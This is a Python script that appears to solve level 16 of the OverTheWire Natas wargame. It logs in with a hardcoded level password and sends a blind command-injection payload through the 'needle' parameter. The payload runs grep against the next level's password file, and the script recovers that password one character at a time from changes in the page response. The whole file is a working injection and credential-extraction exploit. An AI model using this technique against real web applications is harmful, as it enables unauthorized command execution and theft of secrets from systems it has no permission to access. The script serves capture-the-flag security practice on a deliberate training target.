import requests

# Constants
BASE_URL = 'http://natas16.natas.labs.overthewire.org/'
BASE_USERNAME = 'natas16'
BASE_PASSWORD = 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'
CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
PASSWORD_LENGTH = 32

# Initialize the password to an empty string
password = ''
index = 0

while len(password) < PASSWORD_LENGTH:
    current_char = CHARSET[index]
    print(f'Trying character: {current_char}')
    
    # Construct the payload for the command injection
    needle = f'$(grep -E ^{password}{current_char}.* /etc/natas_webpass/natas17)Africans'
    
    # Send the request
    response = requests.get(BASE_URL, 
                            auth=(BASE_USERNAME, BASE_PASSWORD),
                            params={"needle": needle}
                            )
    content = response.text
    
    # Check the response
    if "Africans" not in content:
        password += current_char
        print(f'Password so far: {password.ljust(PASSWORD_LENGTH, "*")}')
        index = 0  # Reset index
    else:
        index += 1

print(f'Final password: {password}')
